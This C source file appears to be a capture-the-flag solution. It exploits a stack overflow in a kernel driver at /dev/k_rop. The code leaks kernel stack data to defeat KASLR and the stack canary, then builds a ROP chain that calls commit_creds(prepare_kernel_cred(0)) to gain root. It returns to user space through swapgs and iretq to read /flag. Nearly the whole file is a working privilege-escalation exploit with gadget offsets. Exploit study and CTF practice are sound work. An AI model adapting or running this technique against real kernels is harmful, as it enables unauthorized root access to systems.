#include <stdio.h>
#include <fcntl.h>
#include <unistd.h>

#define SIZE 0x200
#define KERNEL_BASE 0xffffffff81000000
#define LEAK_OFFSET 0x201532
#define OFF_POP_RDI_RET (0xffffffff810031c4 - KERNEL_BASE)
#define OFF_PREPARE_KERNEL_CREDS (0xffffffff81094670 - KERNEL_BASE)
#define OFF_COMMIT_CREDS (0xffffffff810943d0 - KERNEL_BASE)
#define OFF_MOV_RCX_RAX (0xffffffff814489f4 - KERNEL_BASE)
#define OFF_MOV_RDI_RCX (0xffffffff810e8134 - KERNEL_BASE) //RDX must be 0
#define OFF_POP_RDX_RET (0xffffffff81051398 - KERNEL_BASE)
#define OFF_SWAPGS (0xffffffff81c14530 - KERNEL_BASE)
#define OFF_IRETQ (0xffffffff8102c61b - KERNEL_BASE)

unsigned long long user_cs, rflags, user_rsp, user_ss; 

void get_regs(){
  asm volatile(
    ".intel_syntax noprefix\n"
    "mov %0, cs\n"
    "mov %1, rsp\n"
    "mov %2, ss\n"
    "pushf\n"
    "pop %3\n"
    : "=r"(user_cs), "=r"(user_rsp), "=r"(user_ss), "=r"(rflags) 
    :
    :
  );
}

void win(){
  char buf[0x100] = {0};
  int fd = open("/flag", O_RDONLY);
  read(fd, buf, 0x100);
  write(1, buf, 0x100);
}

int main(int argc, int* argv[]){
  char buff[SIZE];
  int fd, i;
  unsigned long long *ptr;
  ptr = (unsigned long long *)buff;
  
  fd = open("/dev/k_rop", O_RDWR);
  if (fd < 0) {
    perror("open");
    return -1;
  }
  
  read(fd, buff, SIZE); 
  //increasing the size can result in a kernel panic since by writing to much it will overflow the stack kernel page
  
  // leak the content of the stack (leak the canary)
  //for(i=0; i<SIZE; i++){
    //printf("%03d) 0x%llx\n", i, ptr[i]);
  //}
  
  // get registers to use them in the rop chain
  get_regs(); 
  
  // utils for debugging
  unsigned long long kernel_base = ptr[33] - LEAK_OFFSET;
  //printf("Kernel base: 0x%llx\n", kernel_base);
  //printf("ROP CHAIN START: 0x%llx\n", kernel_base + OFF_POP_RDI_RET);
  //printf("AFTER PREPARE: 0x%llx\n", kernel_base + OFF_MOV_RCX_RAX);
  //printf("AFTER COMMIT: 0x%llx\n", kernel_base + OFF_COMMIT_CREDS);
 
  // ROP CHAIN plan: commit_creds(prepare_kernel_creds(0))
  ptr[33] = kernel_base + OFF_POP_RDI_RET;
  ptr[34] = 0;
  ptr[35] = kernel_base + OFF_PREPARE_KERNEL_CREDS;
  ptr[36] = kernel_base + OFF_MOV_RCX_RAX;
  ptr[37] = kernel_base + OFF_POP_RDX_RET;
  ptr[38] = 0;
  ptr[39] = kernel_base + OFF_MOV_RDI_RCX;
  ptr[40] = 0xdeadbeef;
  ptr[41] = kernel_base + OFF_COMMIT_CREDS;

  // SWAPGS: change the gs register from user space to kernel space 
  ptr[42] = kernel_base + OFF_SWAPGS;
  // IRETQ: interrupt return
  ptr[43] = kernel_base + OFF_IRETQ;
  // set arguments
  // RIP
  ptr[44] = win; 
  // CS
  ptr[45] = user_cs;
  // RFLAGS
  ptr[46] = rflags;
  // RSP
  ptr[47] = user_rsp;
  // SS
  ptr[48] = user_ss;
      
  write(fd, buff, SIZE);
}
